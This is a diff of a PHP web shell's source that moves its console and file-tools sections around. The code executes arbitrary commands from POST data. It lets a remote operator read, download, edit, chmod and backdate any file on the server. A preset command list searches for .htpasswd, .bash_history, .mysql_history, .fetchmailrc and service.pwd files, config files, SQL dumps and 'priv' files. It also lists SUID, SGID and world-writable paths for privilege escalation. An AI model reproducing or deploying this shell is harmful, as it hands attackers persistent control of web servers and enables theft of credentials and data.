@@ -54,136 +54,6 @@ if( $os == 'win') {
 if( $cwd[strlen($cwd)-1] != '/' )
 	$cwd .= '/';
 
-// Console go --------------------
-if($os == 'win')
-	$aliases = array(
-		"List Directory" => "dir",
-    	"Find index.php in current dir" => "dir /s /w /b index.php",
-    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
-    	"Show active connections" => "netstat -an",
-    	"Show running services" => "net start",
-    	"User accounts" => "net user",
-    	"Show computers" => "net view",
-		"ARP Table" => "arp -a",
-		"IP Configuration" => "ipconfig /all"
-	);
-else
-	$aliases = array(
-  		"List dir" => "ls -la",
-		"list file attributes on a Linux second extended file system" => "lsattr -va",
-  		"show opened ports" => "netstat -an | grep -i listen",
-		"Find" => "",
-  		"find all suid files" => "find / -type f -perm -04000 -ls",
-  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
-  		"find all sgid files" => "find / -type f -perm -02000 -ls",
-  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
-  		"find config.inc.php files" => "find / -type f -name config.inc.php",
-  		"find config* files" => "find / -type f -name \"config*\"",
-  		"find config* files in current dir" => "find . -type f -name \"config*\"",
-  		"find all writable folders and files" => "find / -perm -2 -ls",
-  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
-  		"find all service.pwd files" => "find / -type f -name service.pwd",
-  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
-  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
-  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
-  		"find all .bash_history files" => "find / -type f -name .bash_history",
-  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
-  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
-  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
-		"Locate" => "",
-  		"locate httpd.conf files" => "locate httpd.conf",
-		"locate vhosts.conf files" => "locate vhosts.conf",
-		"locate proftpd.conf files" => "locate proftpd.conf",
-		"locate psybnc.conf files" => "locate psybnc.conf",
-		"locate my.conf files" => "locate my.conf",
-		"locate admin.php files" =>"locate admin.php",
-		"locate cfg.php files" => "locate cfg.php",
-		"locate conf.php files" => "locate conf.php",
-		"locate config.dat files" => "locate config.dat",
-		"locate config.php files" => "locate config.php",
-		"locate config.inc files" => "locate config.inc",
-		"locate config.inc.php" => "locate config.inc.php",
-		"locate config.default.php files" => "locate config.default.php",
-		"locate config* files " => "locate config",
-		"locate .conf files"=>"locate '.conf'",
-		"locate .pwd files" => "locate '.pwd'",
-		"locate .sql files" => "locate '.sql'",
-		"locate .htpasswd files" => "locate '.htpasswd'",
-		"locate .bash_history files" => "locate '.bash_history'",
-		"locate .mysql_history files" => "locate '.mysql_history'",
-		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
-		"locate backup files" => "locate backup",
-		"locate dump files" => "locate dump",
-		"locate priv files" => "locate priv"	
-	);
-	function actionConsole() {
-	if(isset($_POST['ajax'])) {
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
-		ob_start();
-		echo "document.cf.cmd.value='';\n";
-		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
-		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
-			if(@chdir($match[1])) {
-				$GLOBALS['cwd'] = @getcwd();
-				echo "document.mf.c.value='".$GLOBALS['cwd']."';";
-			}
-		}
-		echo "document.cf.output.value+='".$temp."';";
-		echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
-		$temp = ob_get_clean();
-		echo strlen($temp), "\n", $temp;
-		exit;
-	}
-	printHeader();
-?>
-<script>
-if(window.Event) window.captureEvents(Event.KEYDOWN);
-var cmds = new Array("");
-var cur = 0;
-function kp(e) {
-	var n = (window.Event) ? e.which : e.keyCode;
-	if(n == 38) {
-		cur--;
-		if(cur>=0)
-			document.cf.cmd.value = cmds[cur];
-		else
-			cur++;
-	} else if(n == 40) {
-		cur++;
-		if(cur < cmds.length)
-			document.cf.cmd.value = cmds[cur];
-		else
-			cur--;
-	}
-}
-function add(cmd) {
-	cmds.pop();
-	cmds.push(cmd);
-	cmds.push("");
-	cur = cmds.length-1;
-}
-</script>
-<?php
-	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
-	foreach($GLOBALS['aliases'] as $n => $v) {
-		if($v == '') {
-			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
-			continue;
-		}
-		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
-	}
-	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
-		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
-	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
-	if(!empty($_POST['p1'])) {
-		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
-	}
-	echo '</textarea><table style="border:1px solid #000;background-color:#000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
-	echo '</form></div><script>document.cf.cmd.focus();</script>';
-	printFooter();
-}
-// Console end --------------------
-
 function printHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = "UTF-8";
@@ -503,6 +373,290 @@ function actionSecInfo() {
 }
 // Sec. Info end --------------------
 
+// File tools go -----------------------
+function actionFilesTools() {
+	if( isset($_POST['p1']) )
+		$_POST['p1'] = urldecode($_POST['p1']);
+	if(@$_POST['p2']=='download') {
+		if(is_file($_POST['p1']) && is_readable($_POST['p1'])) {
+			ob_start("ob_gzhandler", 4096);
+			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
+			if (function_exists("mime_content_type")) {
+				$type = @mime_content_type($_POST['p1']);
+				header("Content-Type: ".$type);
+			}
+			$fp = @fopen($_POST['p1'], "r");
+			if($fp) {
+				while(!@feof($fp))
+					echo @fread($fp, 1024);
+				fclose($fp);
+			}
+		} elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {
+		}
+		exit;
+	}
+	if( @$_POST['p2'] == 'mkfile' ) {
+		if(!file_exists($_POST['p1'])) {
+			$fp = @fopen($_POST['p1'], 'w');
+			if($fp) {
+				$_POST['p2'] = "edit";
+				fclose($fp);
+			}
+		}
+	}
+	printHeader();
+	echo '<h1>File tools</h1><div class=content>';
+	if( !file_exists(@$_POST['p1']) ) {
+		echo 'File not exists';
+		printFooter();
+		return;
+	}
+	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
+	$gid = @posix_getgrgid(@fileowner($_POST['p1']));
+	echo '<span>Name:</span> '.htmlspecialchars($_POST['p1']).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
+	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
+	if( empty($_POST['p2']) )
+		$_POST['p2'] = 'view';
+	if( is_file($_POST['p1']) )
+		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
+	else
+		$m = array('Chmod', 'Rename', 'Touch');
+	foreach($m as $v)
+		echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
+	echo '<br><br>';
+	switch($_POST['p2']) {
+		case 'view':
+			echo '<pre class=ml1>';
+			$fp = @fopen($_POST['p1'], 'r');
+			if($fp) {
+				while( !@feof($fp) )
+					echo htmlspecialchars(@fread($fp, 1024));
+				@fclose($fp);
+			}
+			echo '</pre>';
+			break;
+		case 'highlight':
+			if( is_readable($_POST['p1']) ) {
+				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
+				$code = highlight_file($_POST['p1'],true);
+				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
+			}
+			break;
+		case 'chmod':
+			if( !empty($_POST['p3']) ) {
+				$perms = 0;
+				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
+					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
+				if(!@chmod($_POST['p1'], $perms))
+					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
+				else
+					die('<script>g(null,null,null,null,"")</script>');
+			}
+			echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
+			break;
+		case 'edit':
+			if( !is_writable($_POST['p1'])) {
+				echo 'File isn\'t writeable';
+				break;
+			}
+			if( !empty($_POST['p3']) ) {
+				@file_put_contents($_POST['p1'],$_POST['p3']);
+				echo 'Saved!<br><script>document.mf.p3.value="";</script>';
+			}
+			echo '<form onsubmit="g(null,null,null,null,this.text.value);return false;"><textarea name=text class=bigarea>';
+			$fp = @fopen($_POST['p1'], 'r');
+			if($fp) {
+				while( !@feof($fp) )
+					echo htmlspecialchars(@fread($fp, 1024));
+				@fclose($fp);
+			}
+			echo '</textarea><input type=submit value=">>"></form>';
+			break;
+		case 'hexdump':
+			$c = @file_get_contents($_POST['p1']);
+			$n = 0;
+			$h = array('00000000<br>','','');
+			$len = strlen($c);
+			for ($i=0; $i<$len; ++$i) {
+				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
+				switch ( ord($c[$i]) ) {
+					case 0:  $h[2] .= ' '; break;
+					case 9:  $h[2] .= ' '; break;
+					case 10: $h[2] .= ' '; break;
+					case 13: $h[2] .= ' '; break;
+					default: $h[2] .= $c[$i]; break;
+				}
+				$n++;
+				if ($n == 32) {
+					$n = 0;
+					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
+					$h[1] .= '<br>';
+					$h[2] .= "\n";
+				}
+		 	}
+			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
+			break;
+		case 'rename':
+			if( !empty($_POST['p3']) ) {
+				if(!@rename($_POST['p1'], $_POST['p3']))
+					echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
+				else
+					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
+			}
+			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
+			break;
+		case 'touch':
+			if( !empty($_POST['p3']) ) {
+				$time = strtotime($_POST['p3']);
+				if($time) {
+					if(@touch($_POST['p1'],$time,$time))
+						die('<script>g(null,null,null,null,"")</script>');
+					else {
+						echo 'Fail!<script>document.mf.p3.value="";</script>';
+					}
+				} else echo 'Bad time format!<script>document.mf.p3.value="";</script>';
+			}
+			echo '<form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
+			break;
+		case 'mkfile':
+			
+			break;
+	}
+	echo '</div>';
+	printFooter();
+}
+// File tools end ----------------------
+
+// Console go --------------------
+if($os == 'win')
+	$aliases = array(
+		"List Directory" => "dir",
+    	"Find index.php in current dir" => "dir /s /w /b index.php",
+    	"Find *config*.php in current dir" => "dir /s /w /b *config*.php",
+    	"Show active connections" => "netstat -an",
+    	"Show running services" => "net start",
+    	"User accounts" => "net user",
+    	"Show computers" => "net view",
+		"ARP Table" => "arp -a",
+		"IP Configuration" => "ipconfig /all"
+	);
+else
+	$aliases = array(
+  		"List dir" => "ls -la",
+		"list file attributes on a Linux second extended file system" => "lsattr -va",
+  		"show opened ports" => "netstat -an | grep -i listen",
+		"Find" => "",
+  		"find all suid files" => "find / -type f -perm -04000 -ls",
+  		"find suid files in current dir" => "find . -type f -perm -04000 -ls",
+  		"find all sgid files" => "find / -type f -perm -02000 -ls",
+  		"find sgid files in current dir" => "find . -type f -perm -02000 -ls",
+  		"find config.inc.php files" => "find / -type f -name config.inc.php",
+  		"find config* files" => "find / -type f -name \"config*\"",
+  		"find config* files in current dir" => "find . -type f -name \"config*\"",
+  		"find all writable folders and files" => "find / -perm -2 -ls",
+  		"find all writable folders and files in current dir" => "find . -perm -2 -ls",
+  		"find all service.pwd files" => "find / -type f -name service.pwd",
+  		"find service.pwd files in current dir" => "find . -type f -name service.pwd",
+  		"find all .htpasswd files" => "find / -type f -name .htpasswd",
+  		"find .htpasswd files in current dir" => "find . -type f -name .htpasswd",
+  		"find all .bash_history files" => "find / -type f -name .bash_history",
+  		"find .bash_history files in current dir" => "find . -type f -name .bash_history",
+  		"find all .fetchmailrc files" => "find / -type f -name .fetchmailrc",
+  		"find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc",
+		"Locate" => "",
+  		"locate httpd.conf files" => "locate httpd.conf",
+		"locate vhosts.conf files" => "locate vhosts.conf",
+		"locate proftpd.conf files" => "locate proftpd.conf",
+		"locate psybnc.conf files" => "locate psybnc.conf",
+		"locate my.conf files" => "locate my.conf",
+		"locate admin.php files" =>"locate admin.php",
+		"locate cfg.php files" => "locate cfg.php",
+		"locate conf.php files" => "locate conf.php",
+		"locate config.dat files" => "locate config.dat",
+		"locate config.php files" => "locate config.php",
+		"locate config.inc files" => "locate config.inc",
+		"locate config.inc.php" => "locate config.inc.php",
+		"locate config.default.php files" => "locate config.default.php",
+		"locate config* files " => "locate config",
+		"locate .conf files"=>"locate '.conf'",
+		"locate .pwd files" => "locate '.pwd'",
+		"locate .sql files" => "locate '.sql'",
+		"locate .htpasswd files" => "locate '.htpasswd'",
+		"locate .bash_history files" => "locate '.bash_history'",
+		"locate .mysql_history files" => "locate '.mysql_history'",
+		"locate .fetchmailrc files" => "locate '.fetchmailrc'",
+		"locate backup files" => "locate backup",
+		"locate dump files" => "locate dump",
+		"locate priv files" => "locate priv"	
+	);
+	function actionConsole() {
+	if(isset($_POST['ajax'])) {
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
+		ob_start();
+		echo "document.cf.cmd.value='';\n";
+		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".ex($_POST['p1']),"\n\r\t\\'\0"));
+		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
+			if(@chdir($match[1])) {
+				$GLOBALS['cwd'] = @getcwd();
+				echo "document.mf.c.value='".$GLOBALS['cwd']."';";
+			}
+		}
+		echo "document.cf.output.value+='".$temp."';";
+		echo "document.cf.output.scrollTop = document.cf.output.scrollHeight;";
+		$temp = ob_get_clean();
+		echo strlen($temp), "\n", $temp;
+		exit;
+	}
+	printHeader();
+?>
+<script>
+if(window.Event) window.captureEvents(Event.KEYDOWN);
+var cmds = new Array("");
+var cur = 0;
+function kp(e) {
+	var n = (window.Event) ? e.which : e.keyCode;
+	if(n == 38) {
+		cur--;
+		if(cur>=0)
+			document.cf.cmd.value = cmds[cur];
+		else
+			cur++;
+	} else if(n == 40) {
+		cur++;
+		if(cur < cmds.length)
+			document.cf.cmd.value = cmds[cur];
+		else
+			cur--;
+	}
+}
+function add(cmd) {
+	cmds.pop();
+	cmds.push(cmd);
+	cmds.push("");
+	cur = cmds.length-1;
+}
+</script>
+<?php
+	echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(document.cf.cmd.value==\'clear\'){document.cf.output.value=\'\';document.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value);}else{g(null,null,this.cmd.value);} return false;"><select name=alias>';
+	foreach($GLOBALS['aliases'] as $n => $v) {
+		if($v == '') {
+			echo '<optgroup label="-'.htmlspecialchars($n).'-"></optgroup>';
+			continue;
+		}
+		echo '<option value="'.htmlspecialchars($v).'">'.$n.'</option>';
+	}
+	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
+		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
+	echo '</select><input type=button onclick="add(document.cf.alias.value);if(document.cf.ajax.checked){a(null,null,document.cf.alias.value);}else{g(null,null,document.cf.alias.value);}" value=">>"> <input type=checkbox name=ajax value=1 '.($_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX<br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
+	if(!empty($_POST['p1'])) {
+		echo htmlspecialchars("$ ".$_POST['p1']."\n".ex($_POST['p1']));
+	}
+	echo '</textarea><table style="border:1px solid #000;background-color:#000;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td style="padding-left:4px; width:13px;">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
+	echo '</form></div><script>document.cf.cmd.focus();</script>';
+	printFooter();
+}
+// Console end --------------------
+
 // PHP -----------------------
 function actionPhp() {
 	if( isset($_POST['ajax']) ) {
@@ -787,160 +941,6 @@ function actionStringTools() {
 	printFooter();
 }
 // String tools end --------------------
-
-// File tools go -----------------------
-function actionFilesTools() {
-	if( isset($_POST['p1']) )
-		$_POST['p1'] = urldecode($_POST['p1']);
-	if(@$_POST['p2']=='download') {
-		if(is_file($_POST['p1']) && is_readable($_POST['p1'])) {
-			ob_start("ob_gzhandler", 4096);
-			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
-			if (function_exists("mime_content_type")) {
-				$type = @mime_content_type($_POST['p1']);
-				header("Content-Type: ".$type);
-			}
-			$fp = @fopen($_POST['p1'], "r");
-			if($fp) {
-				while(!@feof($fp))
-					echo @fread($fp, 1024);
-				fclose($fp);
-			}
-		} elseif(is_dir($_POST['p1']) && is_readable($_POST['p1'])) {
-		}
-		exit;
-	}
-	if( @$_POST['p2'] == 'mkfile' ) {
-		if(!file_exists($_POST['p1'])) {
-			$fp = @fopen($_POST['p1'], 'w');
-			if($fp) {
-				$_POST['p2'] = "edit";
-				fclose($fp);
-			}
-		}
-	}
-	printHeader();
-	echo '<h1>File tools</h1><div class=content>';
-	if( !file_exists(@$_POST['p1']) ) {
-		echo 'File not exists';
-		printFooter();
-		return;
-	}
-	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
-	$gid = @posix_getgrgid(@fileowner($_POST['p1']));
-	echo '<span>Name:</span> '.htmlspecialchars($_POST['p1']).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
-	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
-	if( empty($_POST['p2']) )
-		$_POST['p2'] = 'view';
-	if( is_file($_POST['p1']) )
-		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
-	else
-		$m = array('Chmod', 'Rename', 'Touch');
-	foreach($m as $v)
-		echo '<a href=# onclick="g(null,null,null,\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
-	echo '<br><br>';
-	switch($_POST['p2']) {
-		case 'view':
-			echo '<pre class=ml1>';
-			$fp = @fopen($_POST['p1'], 'r');
-			if($fp) {
-				while( !@feof($fp) )
-					echo htmlspecialchars(@fread($fp, 1024));
-				@fclose($fp);
-			}
-			echo '</pre>';
-			break;
-		case 'highlight':
-			if( is_readable($_POST['p1']) ) {
-				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
-				$code = highlight_file($_POST['p1'],true);
-				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div>';
-			}
-			break;
-		case 'chmod':
-			if( !empty($_POST['p3']) ) {
-				$perms = 0;
-				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
-					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
-				if(!@chmod($_POST['p1'], $perms))
-					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
-				else
-					die('<script>g(null,null,null,null,"")</script>');
-			}
-			echo '<form onsubmit="g(null,null,null,null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value=">>"></form>';
-			break;
-		case 'edit':
-			if( !is_writable($_POST['p1'])) {
-				echo 'File isn\'t writeable';
-				break;
-			}
-			if( !empty($_POST['p3']) ) {
-				@file_put_contents($_POST['p1'],$_POST['p3']);
-				echo 'Saved!<br><script>document.mf.p3.value="";</script>';
-			}
-			echo '<form onsubmit="g(null,null,null,null,this.text.value);return false;"><textarea name=text class=bigarea>';
-			$fp = @fopen($_POST['p1'], 'r');
-			if($fp) {
-				while( !@feof($fp) )
-					echo htmlspecialchars(@fread($fp, 1024));
-				@fclose($fp);
-			}
-			echo '</textarea><input type=submit value=">>"></form>';
-			break;
-		case 'hexdump':
-			$c = @file_get_contents($_POST['p1']);
-			$n = 0;
-			$h = array('00000000<br>','','');
-			$len = strlen($c);
-			for ($i=0; $i<$len; ++$i) {
-				$h[1] .= sprintf('%02X',ord($c[$i])).' ';
-				switch ( ord($c[$i]) ) {
-					case 0:  $h[2] .= ' '; break;
-					case 9:  $h[2] .= ' '; break;
-					case 10: $h[2] .= ' '; break;
-					case 13: $h[2] .= ' '; break;
-					default: $h[2] .= $c[$i]; break;
-				}
-				$n++;
-				if ($n == 32) {
-					$n = 0;
-					if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
-					$h[1] .= '<br>';
-					$h[2] .= "\n";
-				}
-		 	}
-			echo '<table cellspacing=1 cellpadding=5 bgcolor=#222222><tr><td bgcolor=#333333><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table>';
-			break;
-		case 'rename':
-			if( !empty($_POST['p3']) ) {
-				if(!@rename($_POST['p1'], $_POST['p3']))
-					echo 'Can\'t rename!<br><script>document.mf.p3.value="";</script>';
-				else
-					die('<script>g(null,null,"'.urlencode($_POST['p3']).'",null,"")</script>');
-			}
-			echo '<form onsubmit="g(null,null,null,null,this.name.value);return false;"><input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"><input type=submit value=">>"></form>';
-			break;
-		case 'touch':
-			if( !empty($_POST['p3']) ) {
-				$time = strtotime($_POST['p3']);
-				if($time) {
-					if(@touch($_POST['p1'],$time,$time))
-						die('<script>g(null,null,null,null,"")</script>');
-					else {
-						echo 'Fail!<script>document.mf.p3.value="";</script>';
-					}
-				} else echo 'Bad time format!<script>document.mf.p3.value="";</script>';
-			}
-			echo '<form onsubmit="g(null,null,null,null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
-			break;
-		case 'mkfile':
-			
-			break;
-	}
-	echo '</div>';
-	printFooter();
-}
-// File tools end ----------------------
 
 // Safe mode go ------------------------
 function actionSafeMode() {
